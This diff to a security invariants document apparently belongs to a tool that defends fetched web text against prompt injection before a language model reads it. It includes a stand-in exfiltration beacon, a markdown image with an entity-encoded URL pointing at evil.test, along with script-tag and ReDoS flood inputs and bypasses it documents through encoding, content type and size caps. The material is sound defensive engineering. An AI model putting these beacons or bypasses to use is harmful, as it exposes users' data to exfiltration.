@@ -75,20 +75,56 @@ what a violation looks like, it does not belong on this list.
    `sanitizeAndDetect`, and thereby lost Steps 3–5 while still satisfying "goes
    through sanitisation". An invariant that a defect can satisfy is not an
    invariant. **New text channels call `defendText`; they do not assemble their
-   own pipeline**, with one recorded exception: the header channel passes
-   `decodeEntities: false`. That is a deliberate narrowing, not a weakening —
-   the decode stage's output is *returned*, so on a channel whose consumer does
-   not decode it would manufacture live markup from inert bytes (`LESSONS.md`
-   RC-3). What it costs: Step 5 cannot unmask an entity-encoded injection phrase
-   in a header, so detection is blind to that one vector on that one channel.
+   own pipeline**. Two channels narrow it with `decodeEntities: false` — the
+   header channel and cURL stderr — because the decode stage's output is
+   *returned*, so on a channel whose consumer does not decode it would
+   manufacture live markup from inert bytes (`LESSONS.md` RC-3).
 
-   **Coverage today is partial, and saying so is part of the invariant.** Two
-   channels still take the short path: `jq-query.ts::executeJqQuery` and
-   `post-processor.ts::processTextPart`. The second matters most — for
-   `registerCustomTool()` returns and `beforeRequest` short-circuits the wrap is
-   the *only* defence, and it runs sanitise-and-detect alone. Both are tracked in
-   `docs/todos/001`. A claim of universal coverage would be the same defect this
-   invariant was written about: an assertion a reader trusts and stops checking.
+   **What that narrowing costs, stated correctly:** an entity-encoded beacon or
+   `<script>` block on those two channels **survives the strip**, not merely the
+   detection log. `![x](&#104;ttps://evil.test/?d=…)` is returned intact and a
+   renderer that decodes entity references will fetch it. An earlier revision of
+   this invariant described the cost as "Step 5 cannot unmask an entity-encoded
+   injection phrase", which understated it to a logging blindness. `LESSONS.md`
+   RC-12 records why the obvious fix — decode into a scratch copy — does not
+   resolve it, and `docs/todos/004` carries the open design question.
+
+   **The grammar a channel declares is where the real coverage question lives.**
+   `defendText` on a JSON document runs sanitise-and-detect and no strip stage.
+   So "calls `defendText`" is a weaker statement than it sounds, and reading it
+   as "is fully stripped" is the same mistake this invariant was written about.
+   What the shared call buys is that the exclusion is one decision in one place,
+   reviewable, rather than a subset each caller assembled.
+
+   **That exclusion is scoped to what gets persisted, and only to that.** It
+   exists because `processResponse` writes post-strip content to disk and
+   `jq_query` reads it back, so rewriting `<script>` or `[a](b)` inside a JSON
+   string value there would silently alter a document the origin sent. The
+   post-processor wrap has no disk artefact — a `registerCustomTool()` return
+   goes straight to the model — so it passes `excludeJsonDocuments: false` and a
+   beacon inside a JSON string value IS stripped before the model sees it.
+   Persisted keeps the exemption; returned does not. `LESSONS.md` RC-10.
+
+   **"Persisted keeps it" is true of the content types that can claim it, and
+   that set is narrower than "parses as JSON".** `defendText` gates the
+   exemption on `contentTypeUndetermined || isSniffableContentType(…)`, so a
+   body the origin declared `text/html` or `text/markdown` is treated as what
+   it was declared to be even when it also parses as JSON — measured:
+   `{"a":"<script>x</script>"}` served as `text/html` is persisted as
+   `{"a":""}`, and `jq_query` reads that back. The gate is deliberate and it
+   closes a bypass — an origin could otherwise declare markup, send a
+   JSON-parseable body, and collect the exemption — but it means a declared
+   content type, which the remote writes, decides whether an artefact is
+   altered. Recorded rather than resolved: both directions have a cost, and the
+   bypass is the worse one. Reported by coderabbitai on PR #33 round 5.
+
+   **Above `STRIP_PATH_MAX_BYTES` (256 KB) every channel is Step 2 only.** The
+   cap is a cost circuit-breaker and it is not a defence; on the custom-tool
+   channel, where the wrap is the *only* defence, a handler returning more than
+   256 KB of remote markdown gets sanitise-and-detect alone. That is a stated
+   cost, not an oversight, and it is the reason the strip patterns must stay
+   linear rather than merely capped — see invariant 15.
+
 
 2. **DNS resolution precedes SSRF validation, and cURL is pinned to the validated
    IP.** Any change that lets cURL resolve a name itself reopens DNS rebinding.
@@ -128,9 +164,117 @@ what a violation looks like, it does not belong on this list.
     `min(LIMITS.MAX_HEADER_TEXT_BYTES, max_result_size)` — its own ceiling AND
     the caller's inline budget, because it is returned inline even when the body
     was saved to a file. A value added to the result after the size gate has run
-    is unbounded in practice, whatever the gate reports. The cap is applied after
-    the defence pipeline as well as before it, since `[link removed]` is longer
-    than some of the forms it replaces.
+    is unbounded in practice, whatever the gate reports.
+
+    **The gate weighs the DEFENDED bytes, because the defence can add them.**
+    `[link removed]` is 14 bytes and the shortest form it replaces is 9, so a
+    body measured raw can pass a cap it then exceeds on the way to the model —
+    `"[a](file:)".repeat(100)` returned 1400 bytes under a 1000-byte cap. The
+    predicate is `processor.ts::exceedsInlineCap` and both size gates call it;
+    a gate that measures its input rather than its output is the violation.
+
+    **The gate belongs where the body is still a discrete string, not at the
+    wrap.** By the wrap the body is sealed inside `formatResponse`'s JSON
+    envelope: there is no body left to bound, a byte-truncation would cut the
+    envelope mid-JSON, and the wrap has no file to save to. Measured: a
+    *compliant* 1000-byte body reaches the wrap as a 1057-byte text part under
+    `include_metadata`, so a wrap-side cap truncates correct responses. What the
+    wrap gets instead is a guarantee from upstream. `LESSONS.md` RC-15.
+
+    **Invariant 16 gives the wrap the envelope's structure and does not move
+    this gate.** Seeing the fields is not the same as knowing the caller's
+    `max_result_size`, and the wrap still has no file to save what it would
+    trim — so the cap stays upstream, where both are in hand.
+
+15. **Every regex in the strip path is linear in the size of its input, and the
+    byte cap is not what makes it so.** A `g`-flagged replace starts a match
+    attempt at every position, so a pattern that is linear *per attempt* is
+    quadratic *per pass*. `STRIP_PATH_MAX_BYTES` bounds the input, never the
+    cost: at 256 KB the pre-fix markdown patterns took 82 seconds and the block
+    patterns 4.5, synchronously, on the thread serving every session. A
+    violation looks like a failing match attempt that can scan an unbounded
+    distance forward — so the test is whether the character classes and anchors
+    make a failure O(1), not whether a cap exists.
+
+    **Enforced in two places that only work together.** `strip-blocks.ts`'s
+    `withinClosableRegion` runs each pass over only the prefix ending at that
+    pattern's own closing token, so within it every attempt has a closer
+    ahead. **Keying that bound on the wrong token is how this has failed
+    twice** — a bare `>` does not bound a pattern whose closer is `</script>`,
+    and excluding `[` from a markdown label does not bound a URL class that
+    ends at `)`. Both shipped past a review and a flood test; measurement
+    caught them at 1.1 s and 2.9 s for a 256 KB body. Name the token the
+    pattern must consume, and bound on that one.
+
+    **The region bound is necessary and not sufficient, and that is the third
+    failure.** A closer ahead is not a closer the attempt can REACH: with the
+    opener written `<script\b[^>]*>`, an attribute run crossing `<` consumed
+    the region's only closer as its own terminator, and every one of
+    `"<script".repeat(30000) + "</script>"`'s openers then scanned to
+    end-of-input for a second closer — 2881 ms, inside a correctly-computed
+    bound. **The character classes carry what the region cannot.** A class
+    must exclude every delimiter the match still has to consume on its way to
+    its closer — not merely the next one. Excluding only the next one is what
+    shipped: `<script\b[^>]*>` excludes `>`, the token it reaches first, and
+    still ate the `<` that began the region's only closer. So the tag opener,
+    the tag closer and `lastTagCloserEnd`'s walk are all `[^<>]*`, and the
+    markdown URL class is `[^)\n]+`.
+
+    **Exclusion is the test this project applies, not the only way a pattern
+    can be linear** — a class that consumes a later delimiter is still linear
+    if failed attempts partition the input into disjoint spans. That argument
+    is harder than it looks and has been got wrong three times here, so
+    exclusion is the default and partitioning is the exception: make it
+    explicitly, in the docblock, with a flood test that omits the token the
+    pattern needs. Change any class and argue it against both mechanisms.
+
+    **A removal can splice a new token out of its neighbours**, so a strip that
+    deletes is not finished when its pattern stops matching. Iterating a
+    `replace` does not close this: each pass exposes exactly one layer, so a
+    capped fixed point only moves the surviving depth to the cap, and the
+    attacker picks the depth. Both strips here therefore SCAN, testing the
+    OUTPUT tail after every character — convergence by construction, no
+    iteration. This was reported by CodeQL on two consecutive review rounds and
+    declined both times on the strength of the loop; the cap was the defect.
+
+    **A flood test is a guard only if it omits the token the pattern needs.**
+    Two generations of guard here fed inputs the then-current bound already
+    handled, so both passed while the defect was live. `REDOS_BUDGET_MS` in
+    `strip-blocks.test.ts` carries the calibration, and why a 2 s budget was
+    worthless against a 1.1 s regression. `LESSONS.md` RC-11.
+
+16. **A composite document is defended region by region, never as one string.**
+    The strip stages work by pairing an opening token with a closing one, and
+    they cannot see the syntax that separates two regions — so run over a
+    serialised JSON document they pair an opener in one value with a closer in
+    a later one and delete everything between, the intervening key included.
+    **The output is still valid JSON, which is why nothing downstream can
+    detect it.** Measured: a body holding `<!--` and a response header holding
+    `-->` returned an envelope with the whole `headers` key gone, and
+    `{"a":"open <!--","b":"close -->","c":"kept"}` came back as
+    `{"a":"open ","c":"kept"}`. `defendForInline` therefore parses a JSON
+    document and defends each string LEAF; the undivided scan is the arm for
+    text that is not JSON.
+
+    This is the same property invariant 13 states for the header/body split,
+    at a different layer: a boundary between remote-controlled regions comes
+    from structure we can trust, never from the bytes. **A violation looks like
+    a defence pass whose input spans more than one region** — so the question
+    to ask of any new call is *what regions are in this string, and does the
+    pass respect them?*
+
+    **Re-serialising is indented only where indenting does not GROW the
+    document**, because a sparsely formatted one re-inflates by its nesting
+    depth — 53 bytes in, 140 out, measured — and no constant bounds that, so
+    the naive rule would break invariant 14's cheap arm while fixing this one.
+    Comparing against the input needs no constant. `formatResponse` and jq both
+    emit two spaces and so come back unchanged.
+
+    Object keys are deliberately left undefended: two keys defending to the
+    same string would collapse into one, which is the very loss this invariant
+    exists to stop. Re-serialising also normalises number spelling (`1.50` →
+    `1.5`); nothing inline reads meaning from it, and the persisted artefact
+    never takes this path. `LESSONS.md` RC-16.
 
 ## Environments
 
